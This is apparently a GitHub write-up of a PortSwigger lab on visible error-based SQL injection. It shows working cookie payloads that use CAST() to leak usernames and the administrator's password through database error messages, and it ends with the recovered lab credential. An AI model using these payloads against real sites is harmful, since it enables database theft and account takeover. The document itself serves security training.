## Lab Description -

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/7b1dd11f-f3b1-440d-bb44-28ee670b8d81)


## Overview -

Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an id parameter: 

```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

We can induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a "visible" one.

One way of achieving this is to use the CAST() function, which enables you to convert one data type to another. For example, consider a query containing the following statement:

**Resquest payload**

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an int, may cause an error similar to the following: 

**Response**

```sql
ERROR: invalid input syntax for type integer: "Example data"
```

> NOTE - This type of query may also be useful in cases where you're unable to trigger conditional responses because of a character limit imposed on the 
> query. 


## Solution - 

When clicking on any catgory in products filter, browser sends a GET request with a **tracking cookie** & a session cookie.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/e432089d-8a2b-40aa-b833-6de948b77c99)

Let's try to input a special character `'` in the TrackingID parameter since it is vulnerable as per lab description to try and induce an SQL error.

```sql
Cookie: TrackingId=e00R0OKbtGq3H944';
```

**Response**

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/d6f796a8-4fca-49cb-9de1-9738d7f1fd63)

Now we induced an error in the application and so we got an error response back which leaked the query  being made in the backend.

```sql
SELECT * FROM tracking WHERE id = 'e00R0OKbtGq3H944''
```

Since we know what query is being made, now we can craft our payload using CAST conditional expresiions.

First we give a generic SELECT query & CAST the returned value to **int** datatype.

```sql
TrackingId=hxcQNYCw0qIfVGRe' AND CAST((SELECT 1) AS int)--
```
The subquery (SELECT 1) is selecting the value 1 from the database. The CAST function is then used to convert that value into an integer data type (AS int).

**Response**

We get a `500 Internal Server error` with the following error response.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/1fe94c52-7326-4f40-a87b-4b9734069c80)

It says that **AND condition must be a boolean expression.**

So we modify the injection payload with a comparison operator so that it returns boolean data.

```sql
TrackingId=hxcQNYCw0qIfVGRe' AND 1=CAST((SELECT 1) AS int)--
```

Now we get a different response ie. **The condition got TRUE and it returned all the category items** with a `200 OK` status code.


Now modify the *SELECT* query to retreive username from the database.

```sql
' AND 1=CAST((SELECT username FROM users) AS int)--
```

**Response**

We get a `500 Internal Server error` with the follwoing error response back.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/7d95c1dc-4db8-46b0-bb65-f8065990fe62)

```sql
SELECT * FROM tracking WHERE id = 'hxcQNYCw0qIfVGRe' AND 1=CAST((SELECT username FROM users) AS'. Expected char
````

THe query is being truncated here. So lets either remove some or all of `trackingID` cookie value to free up some space.

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--;
```
**Response**


![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/a4e78b22-de7e-47a4-ba3b-a74c8aab8615)

Modify the query to return only 1 row,

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
It tries to retrieve the **username** column from the **users** table using the subquery **(SELECT username FROM users LIMIT 1)**. The **LIMIT 1** clause ensures that only one row(*first row*) is returned. 

The obtained username is then cast as an integer using the CAST function.(WHY ? - To retrieve the obtained info via the error responses)
EG - It may produce error like `User shebu is not an integer`

**Response** 

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/6657559f-6166-4c0b-96a3-37cf160ceb52)

Now that we know that `administrator` is the first user in the users table , let's retreive his password.

```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

Here in this payload we didn't giove  `WHERE username="administrator"` because LIMIT 1 ensures that it retreives the info of first column which in this case is the administrator.

Thus we got the password of the admin user via error response.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/3f9b50f7-1043-4530-b14d-bf00e9f6817b)

Admin Credentials - `administrator:92xxhtubhmgxhsyhhldk`

Now login as admin in the shopping website to solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/9bda09a5-5c7b-4c2b-822b-8353e27075a2)
























